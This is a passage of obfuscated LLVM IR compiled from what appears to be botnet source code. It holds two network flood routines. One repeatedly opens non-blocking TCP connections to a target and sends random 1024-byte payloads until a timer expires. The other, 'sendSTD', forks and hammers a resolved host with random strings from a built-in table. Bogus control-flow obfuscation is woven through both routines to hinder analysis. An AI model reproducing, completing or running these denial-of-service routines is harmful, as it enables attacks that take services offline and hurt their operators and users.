; <label>:48:                                     ; preds = %originalBBpart2
  %49 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 3
  %50 = getelementptr inbounds [8 x i8], [8 x i8]* %49, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 8, i32 4, i1 false)
  %51 = load i32, i32* %15, align 4
  %52 = zext i32 %51 to i64
  %53 = call i8* @llvm.stacksave()
  store i8* %53, i8** %18, align 8
  %54 = alloca %struct.state_t, i64 %52, align 16
  %55 = bitcast %struct.state_t* %54 to i8*
  %56 = load i32, i32* %15, align 4
  %57 = sext i32 %56 to i64
  %58 = mul i64 %57, 5
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 %58, i32 16, i1 false)
  %59 = call noalias i8* @malloc(i64 1024) #2
  store i8* %59, i8** %24, align 8
  %60 = load i8*, i8** %24, align 8
  call void @llvm.memset.p0i8.i64(i8* %60, i8 0, i64 1024, i32 1, i1 false)
  %61 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %62 = load i32, i32* %14, align 4
  %63 = add nsw i32 %61, %62
  store i32 %63, i32* %25, align 4
  br label %64

; <label>:64:                                     ; preds = %originalBBpart235, %48
  %65 = load i32, i32* %25, align 4
  %66 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %67 = icmp sgt i32 %65, %66
  br i1 %67, label %68, label %368

; <label>:68:                                     ; preds = %64
  store i32 0, i32* %16, align 4
  br label %69

; <label>:69:                                     ; preds = %348, %68
  %70 = load i32, i32* %16, align 4
  %71 = load i32, i32* %15, align 4
  %72 = icmp slt i32 %70, %71
  br i1 %72, label %73, label %351

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* %16, align 4
  %75 = sext i32 %74 to i64
  %76 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %75
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %76, i32 0, i32 1
  %78 = load i8, i8* %77, align 4
  %79 = zext i8 %78 to i32
  switch i32 %79, label %347 [
    i32 0, label %80
    i32 1, label %124
    i32 2, label %305
  ]

; <label>:80:                                     ; preds = %73
  %81 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %82 = load i32, i32* %16, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %83
  %85 = getelementptr inbounds %struct.state_t, %struct.state_t* %84, i32 0, i32 0
  store i32 %81, i32* %85, align 8
  %86 = load i32, i32* %16, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %87
  %89 = getelementptr inbounds %struct.state_t, %struct.state_t* %88, i32 0, i32 0
  %90 = load i32, i32* %89, align 8
  %91 = load i32, i32* %16, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %92
  %94 = getelementptr inbounds %struct.state_t, %struct.state_t* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 8
  %96 = call i32 (i32, i32, ...) @fcntl(i32 %95, i32 3, i8* null)
  %97 = or i32 %96, 2048
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %90, i32 4, i32 %97)
  %99 = load i32, i32* %16, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %100
  %102 = getelementptr inbounds %struct.state_t, %struct.state_t* %101, i32 0, i32 0
  %103 = load i32, i32* %102, align 8
  %104 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %105 = call i32 @connect(i32 %103, %struct.sockaddr* %104, i32 16)
  %106 = icmp ne i32 %105, -1
  br i1 %106, label %111, label %107

; <label>:107:                                    ; preds = %80
  %108 = call i32* @__errno_location() #13
  %109 = load i32, i32* %108, align 4
  %110 = icmp ne i32 %109, 115
  br i1 %110, label %111, label %118

; <label>:111:                                    ; preds = %107, %80
  %112 = load i32, i32* %16, align 4
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %113
  %115 = getelementptr inbounds %struct.state_t, %struct.state_t* %114, i32 0, i32 0
  %116 = load i32, i32* %115, align 8
  %117 = call i32 @close(i32 %116)
  br label %123

; <label>:118:                                    ; preds = %107
  %119 = load i32, i32* %16, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %120
  %122 = getelementptr inbounds %struct.state_t, %struct.state_t* %121, i32 0, i32 1
  store i8 1, i8* %122, align 4
  br label %123

; <label>:123:                                    ; preds = %118, %111
  br label %347

; <label>:124:                                    ; preds = %73
  %125 = load i32, i32* @x.55
  %126 = load i32, i32* @y.56
  %127 = sub i32 %125, 1
  %128 = mul i32 %125, %127
  %129 = urem i32 %128, 2
  %130 = icmp eq i32 %129, 0
  %131 = icmp slt i32 %126, 10
  %132 = or i1 %130, %131
  br i1 %132, label %originalBB5, label %originalBB5alteredBB

originalBB5:                                      ; preds = %originalBB5alteredBB, %124
  %133 = load i32, i32* @x.55
  %134 = load i32, i32* @y.56
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart27, label %originalBB5alteredBB

originalBBpart27:                                 ; preds = %originalBB5
  br label %141

; <label>:141:                                    ; preds = %originalBBpart27
  %142 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %143 = getelementptr inbounds [16 x i64], [16 x i64]* %142, i64 0, i64 0
  %144 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %143) #2, !srcloc !6
  %145 = extractvalue { i64, i64* } %144, 0
  %146 = extractvalue { i64, i64* } %144, 1
  %147 = trunc i64 %145 to i32
  store i32 %147, i32* %26, align 4
  %148 = ptrtoint i64* %146 to i64
  %149 = trunc i64 %148 to i32
  store i32 %149, i32* %27, align 4
  br label %150

; <label>:150:                                    ; preds = %141
  %151 = load i32, i32* @x.55
  %152 = load i32, i32* @y.56
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %150
  %159 = load i32, i32* @x.55
  %160 = load i32, i32* @y.56
  %161 = sub i32 %159, 1
  %162 = mul i32 %159, %161
  %163 = urem i32 %162, 2
  %164 = icmp eq i32 %163, 0
  %165 = icmp slt i32 %160, 10
  %166 = or i1 %164, %165
  br i1 %166, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br label %167

; <label>:167:                                    ; preds = %originalBBpart211
  %168 = load i32, i32* %16, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %169
  %171 = getelementptr inbounds %struct.state_t, %struct.state_t* %170, i32 0, i32 0
  %172 = load i32, i32* %171, align 8
  %173 = srem i32 %172, 64
  %174 = zext i32 %173 to i64
  %175 = shl i64 1, %174
  %176 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %19, i32 0, i32 0
  %177 = load i32, i32* %16, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %178
  %180 = getelementptr inbounds %struct.state_t, %struct.state_t* %179, i32 0, i32 0
  %181 = load i32, i32* %180, align 8
  %182 = sdiv i32 %181, 64
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds [16 x i64], [16 x i64]* %176, i64 0, i64 %183
  %185 = load i64, i64* %184, align 8
  %186 = or i64 %185, %175
  store i64 %186, i64* %184, align 8
  %187 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 0
  store i64 0, i64* %187, align 8
  %188 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 1
  store i64 10000, i64* %188, align 8
  %189 = load i32, i32* %16, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %190
  %192 = getelementptr inbounds %struct.state_t, %struct.state_t* %191, i32 0, i32 0
  %193 = load i32, i32* %192, align 8
  %194 = add nsw i32 %193, 1
  %195 = call i32 @select(i32 %194, %struct.__sigset_t* null, %struct.__sigset_t* %19, %struct.__sigset_t* null, %struct.timeval* %20)
  store i32 %195, i32* %23, align 4
  %196 = load i32, i32* %23, align 4
  %197 = icmp eq i32 %196, 1
  br i1 %197, label %198, label %257

; <label>:198:                                    ; preds = %167
  store i32 4, i32* %21, align 4
  %199 = load i32, i32* %16, align 4
  %200 = sext i32 %199 to i64
  %201 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %200
  %202 = getelementptr inbounds %struct.state_t, %struct.state_t* %201, i32 0, i32 0
  %203 = load i32, i32* %202, align 8
  %204 = bitcast i32* %22 to i8*
  %205 = call i32 @getsockopt(i32 %203, i32 1, i32 4, i8* %204, i32* %21) #2
  %206 = load i32, i32* %22, align 4
  %207 = icmp ne i32 %206, 0
  br i1 %207, label %208, label %235

; <label>:208:                                    ; preds = %198
  %209 = load i32, i32* @x.55
  %210 = load i32, i32* @y.56
  %211 = sub i32 %209, 1
  %212 = mul i32 %209, %211
  %213 = urem i32 %212, 2
  %214 = icmp eq i32 %213, 0
  %215 = icmp slt i32 %210, 10
  %216 = or i1 %214, %215
  br i1 %216, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %208
  %217 = load i32, i32* %16, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %218
  %220 = getelementptr inbounds %struct.state_t, %struct.state_t* %219, i32 0, i32 0
  %221 = load i32, i32* %220, align 8
  %222 = call i32 @close(i32 %221)
  %223 = load i32, i32* %16, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %224
  %226 = getelementptr inbounds %struct.state_t, %struct.state_t* %225, i32 0, i32 1
  store i8 0, i8* %226, align 4
  %227 = load i32, i32* @x.55
  %228 = load i32, i32* @y.56
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br label %256

; <label>:235:                                    ; preds = %198
  %236 = load i32, i32* @x.55
  %237 = load i32, i32* @y.56
  %238 = sub i32 %236, 1
  %239 = mul i32 %236, %238
  %240 = urem i32 %239, 2
  %241 = icmp eq i32 %240, 0
  %242 = icmp slt i32 %237, 10
  %243 = or i1 %241, %242
  br i1 %243, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %235
  %244 = load i32, i32* %16, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %245
  %247 = getelementptr inbounds %struct.state_t, %struct.state_t* %246, i32 0, i32 1
  store i8 2, i8* %247, align 4
  %248 = load i32, i32* @x.55
  %249 = load i32, i32* @y.56
  %250 = sub i32 %248, 1
  %251 = mul i32 %248, %250
  %252 = urem i32 %251, 2
  %253 = icmp eq i32 %252, 0
  %254 = icmp slt i32 %249, 10
  %255 = or i1 %253, %254
  br i1 %255, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %256

; <label>:256:                                    ; preds = %originalBBpart219, %originalBBpart215
  br label %304

; <label>:257:                                    ; preds = %167
  %258 = load i32, i32* @x.55
  %259 = load i32, i32* @y.56
  %260 = sub i32 %258, 1
  %261 = mul i32 %258, %260
  %262 = urem i32 %261, 2
  %263 = icmp eq i32 %262, 0
  %264 = icmp slt i32 %259, 10
  %265 = or i1 %263, %264
  br i1 %265, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %257
  %266 = load i32, i32* %23, align 4
  %267 = icmp eq i32 %266, -1
  %268 = load i32, i32* @x.55
  %269 = load i32, i32* @y.56
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br i1 %267, label %276, label %303

; <label>:276:                                    ; preds = %originalBBpart223
  %277 = load i32, i32* @x.55
  %278 = load i32, i32* @y.56
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %276
  %285 = load i32, i32* %16, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %286
  %288 = getelementptr inbounds %struct.state_t, %struct.state_t* %287, i32 0, i32 0
  %289 = load i32, i32* %288, align 8
  %290 = call i32 @close(i32 %289)
  %291 = load i32, i32* %16, align 4
  %292 = sext i32 %291 to i64
  %293 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %292
  %294 = getelementptr inbounds %struct.state_t, %struct.state_t* %293, i32 0, i32 1
  store i8 0, i8* %294, align 4
  %295 = load i32, i32* @x.55
  %296 = load i32, i32* @y.56
  %297 = sub i32 %295, 1
  %298 = mul i32 %295, %297
  %299 = urem i32 %298, 2
  %300 = icmp eq i32 %299, 0
  %301 = icmp slt i32 %296, 10
  %302 = or i1 %300, %301
  br i1 %302, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %303

; <label>:303:                                    ; preds = %originalBBpart227, %originalBBpart223
  br label %304

; <label>:304:                                    ; preds = %303, %256
  br label %347

; <label>:305:                                    ; preds = %73
  %306 = load i32, i32* @x.55
  %307 = load i32, i32* @y.56
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %305
  %314 = load i8*, i8** %24, align 8
  call void @makeRandomStr(i8* %314, i32 1024)
  %315 = load i32, i32* %16, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %316
  %318 = getelementptr inbounds %struct.state_t, %struct.state_t* %317, i32 0, i32 0
  %319 = load i32, i32* %318, align 8
  %320 = load i8*, i8** %24, align 8
  %321 = call i64 @send(i32 %319, i8* %320, i64 1024, i32 16384)
  %322 = icmp eq i64 %321, -1
  %323 = load i32, i32* @x.55
  %324 = load i32, i32* @y.56
  %325 = sub i32 %323, 1
  %326 = mul i32 %323, %325
  %327 = urem i32 %326, 2
  %328 = icmp eq i32 %327, 0
  %329 = icmp slt i32 %324, 10
  %330 = or i1 %328, %329
  br i1 %330, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %322, label %331, label %346

; <label>:331:                                    ; preds = %originalBBpart231
  %332 = call i32* @__errno_location() #13
  %333 = load i32, i32* %332, align 4
  %334 = icmp ne i32 %333, 11
  br i1 %334, label %335, label %346

; <label>:335:                                    ; preds = %331
  %336 = load i32, i32* %16, align 4
  %337 = sext i32 %336 to i64
  %338 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %337
  %339 = getelementptr inbounds %struct.state_t, %struct.state_t* %338, i32 0, i32 0
  %340 = load i32, i32* %339, align 8
  %341 = call i32 @close(i32 %340)
  %342 = load i32, i32* %16, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %343
  %345 = getelementptr inbounds %struct.state_t, %struct.state_t* %344, i32 0, i32 1
  store i8 0, i8* %345, align 4
  br label %346

; <label>:346:                                    ; preds = %335, %331, %originalBBpart231
  br label %347

; <label>:347:                                    ; preds = %346, %304, %123, %73
  br label %348

; <label>:348:                                    ; preds = %347
  %349 = load i32, i32* %16, align 4
  %350 = add nsw i32 %349, 1
  store i32 %350, i32* %16, align 4
  br label %69

; <label>:351:                                    ; preds = %69
  %352 = load i32, i32* @x.55
  %353 = load i32, i32* @y.56
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %351
  %360 = load i32, i32* @x.55
  %361 = load i32, i32* @y.56
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br label %64

; <label>:368:                                    ; preds = %64
  %369 = load i32, i32* @x.55
  %370 = load i32, i32* @y.56
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %368
  %377 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %377)
  %378 = load i32, i32* @x.55
  %379 = load i32, i32* @y.56
  %380 = sub i32 %378, 1
  %381 = mul i32 %378, %380
  %382 = urem i32 %381, 2
  %383 = icmp eq i32 %382, 0
  %384 = icmp slt i32 %379, 10
  %385 = or i1 %383, %384
  br i1 %385, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %386

; <label>:386:                                    ; preds = %originalBBpart239, %47
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %387 = alloca i8*, align 8
  %388 = alloca i32, align 4
  %389 = alloca i32, align 4
  %390 = alloca i32, align 4
  %391 = alloca i32, align 4
  %392 = alloca %struct.sockaddr_in, align 4
  %393 = alloca i8*, align 8
  %394 = alloca %struct.__sigset_t, align 8
  %395 = alloca %struct.timeval, align 8
  %396 = alloca i32, align 4
  %397 = alloca i32, align 4
  %398 = alloca i32, align 4
  %399 = alloca i8*, align 8
  %400 = alloca i32, align 4
  %401 = alloca i32, align 4
  %402 = alloca i32, align 4
  store i8* %0, i8** %387, align 8
  store i32 %1, i32* %388, align 4
  store i32 %2, i32* %389, align 4
  %403 = call i32 @getdtablesize() #2
  %_ = sub i32 0, %403
  %gen = add i32 %_, 2
  %_1 = sub i32 %403, 2
  %gen2 = mul i32 %_1, 2
  %_3 = sub i32 0, %403
  %gen4 = add i32 %_3, 2
  %404 = sdiv i32 %403, 2
  store i32 %404, i32* %390, align 4
  %405 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %392, i32 0, i32 0
  store i16 2, i16* %405, align 4
  %406 = load i32, i32* %388, align 4
  %407 = trunc i32 %406 to i16
  %408 = call zeroext i16 @htons(i16 zeroext %407) #13
  %409 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %392, i32 0, i32 1
  store i16 %408, i16* %409, align 2
  %410 = load i8*, i8** %387, align 8
  %411 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %392, i32 0, i32 2
  %412 = call i32 @getHost(i8* %410, %struct.in_addr* %411)
  %413 = icmp ne i32 %412, 0
  br label %originalBB

originalBB5alteredBB:                             ; preds = %originalBB5, %124
  br label %originalBB5

originalBB9alteredBB:                             ; preds = %originalBB9, %150
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %208
  %414 = load i32, i32* %16, align 4
  %415 = sext i32 %414 to i64
  %416 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %415
  %417 = getelementptr inbounds %struct.state_t, %struct.state_t* %416, i32 0, i32 0
  %418 = load i32, i32* %417, align 8
  %419 = call i32 @close(i32 %418)
  %420 = load i32, i32* %16, align 4
  %421 = sext i32 %420 to i64
  %422 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %421
  %423 = getelementptr inbounds %struct.state_t, %struct.state_t* %422, i32 0, i32 1
  store i8 0, i8* %423, align 4
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %235
  %424 = load i32, i32* %16, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %425
  %427 = getelementptr inbounds %struct.state_t, %struct.state_t* %426, i32 0, i32 1
  store i8 2, i8* %427, align 4
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %257
  %428 = load i32, i32* %23, align 4
  %429 = icmp eq i32 %428, -1
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %276
  %430 = load i32, i32* %16, align 4
  %431 = sext i32 %430 to i64
  %432 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %431
  %433 = getelementptr inbounds %struct.state_t, %struct.state_t* %432, i32 0, i32 0
  %434 = load i32, i32* %433, align 8
  %435 = call i32 @close(i32 %434)
  %436 = load i32, i32* %16, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %437
  %439 = getelementptr inbounds %struct.state_t, %struct.state_t* %438, i32 0, i32 1
  store i8 0, i8* %439, align 4
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %305
  %440 = load i8*, i8** %24, align 8
  call void @makeRandomStr(i8* %440, i32 1024)
  %441 = load i32, i32* %16, align 4
  %442 = sext i32 %441 to i64
  %443 = getelementptr inbounds %struct.state_t, %struct.state_t* %54, i64 %442
  %444 = getelementptr inbounds %struct.state_t, %struct.state_t* %443, i32 0, i32 0
  %445 = load i32, i32* %444, align 8
  %446 = load i8*, i8** %24, align 8
  %447 = call i64 @send(i32 %445, i8* %446, i64 1024, i32 16384)
  %448 = icmp eq i64 %447, -1
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %351
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %368
  %449 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %449)
  br label %originalBB37
}

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.57
  %5 = load i32, i32* @y.58
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i64, align 8
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca %struct.hostent*, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca [36 x i8*], align 16
  %23 = alloca i8*, align 8
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %24 = call i32 @fork() #2
  store i32 %24, i32* %16, align 4
  %25 = load i32, i32* %16, align 4
  %26 = icmp sgt i32 %25, 0
  %27 = load i32, i32* @x.57
  %28 = load i32, i32* @y.58
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %38, label %35

; <label>:35:                                     ; preds = %originalBBpart2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %36, 1
  br i1 %37, label %38, label %39

; <label>:38:                                     ; preds = %35, %originalBBpart2
  ret void

; <label>:39:                                     ; preds = %35
  %40 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %40, i32* %15, align 4
  %41 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %42 = sext i32 %41 to i64
  store i64 %42, i64* %17, align 8
  %43 = load i8*, i8** %12, align 8
  %44 = call %struct.hostent* @gethostbyname(i8* %43)
  store %struct.hostent* %44, %struct.hostent** %19, align 8
  %45 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %45, i8 0, i64 16, i32 4, i1 false)
  %46 = load %struct.hostent*, %struct.hostent** %19, align 8
  %47 = getelementptr inbounds %struct.hostent, %struct.hostent* %46, i32 0, i32 4
  %48 = load i8**, i8*** %47, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 0
  %50 = load i8*, i8** %49, align 8
  %51 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %52 = bitcast %struct.in_addr* %51 to i8*
  %53 = load %struct.hostent*, %struct.hostent** %19, align 8
  %54 = getelementptr inbounds %struct.hostent, %struct.hostent* %53, i32 0, i32 3
  %55 = load i32, i32* %54, align 4
  %56 = sext i32 %55 to i64
  call void @bcopy(i8* %50, i8* %52, i64 %56) #2
  %57 = load %struct.hostent*, %struct.hostent** %19, align 8
  %58 = getelementptr inbounds %struct.hostent, %struct.hostent* %57, i32 0, i32 2
  %59 = load i32, i32* %58, align 8
  %60 = trunc i32 %59 to i16
  %61 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 %60, i16* %61, align 4
  %62 = load i32, i32* %13, align 4
  %63 = trunc i32 %62 to i16
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %63, i16* %64, align 2
  store i32 0, i32* %20, align 4
  store i32 450, i32* %21, align 4
  br label %65

; <label>:65:                                     ; preds = %142, %39
  %66 = load i32, i32* @x.57
  %67 = load i32, i32* @y.58
  %68 = sub i32 %66, 1
  %69 = mul i32 %66, %68
  %70 = urem i32 %69, 2
  %71 = icmp eq i32 %70, 0
  %72 = icmp slt i32 %67, 10
  %73 = or i1 %71, %72
  br i1 %73, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %65
  %74 = bitcast [36 x i8*]* %22 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %74, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %75 = call i32 @rand() #2
  %76 = sext i32 %75 to i64
  %77 = urem i64 %76, 36
  %78 = getelementptr inbounds [36 x i8*], [36 x i8*]* %22, i64 0, i64 %77
  %79 = load i8*, i8** %78, align 8
  store i8* %79, i8** %23, align 8
  %80 = load i32, i32* %20, align 4
  %81 = icmp uge i32 %80, 50
  %82 = load i32, i32* @x.57
  %83 = load i32, i32* @y.58
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br i1 %81, label %90, label %142

; <label>:90:                                     ; preds = %originalBBpart26
  %91 = load i32, i32* @x.57
  %92 = load i32, i32* @y.58
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %90
  %99 = load i32, i32* %15, align 4
  %100 = load i8*, i8** %23, align 8
  %101 = load i32, i32* %21, align 4
  %102 = sext i32 %101 to i64
  %103 = call i64 @send(i32 %99, i8* %100, i64 %102, i32 0)
  %104 = load i32, i32* %15, align 4
  %105 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %106 = call i32 @connect(i32 %104, %struct.sockaddr* %105, i32 16)
  %107 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %108 = sext i32 %107 to i64
  %109 = load i64, i64* %17, align 8
  %110 = load i32, i32* %14, align 4
  %111 = sext i32 %110 to i64
  %112 = add nsw i64 %109, %111
  %113 = icmp sge i64 %108, %112
  %114 = load i32, i32* @x.57
  %115 = load i32, i32* @y.58
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart216, label %originalBB8alteredBB

originalBBpart216:                                ; preds = %originalBB8
  br i1 %113, label %122, label %141

; <label>:122:                                    ; preds = %originalBBpart216
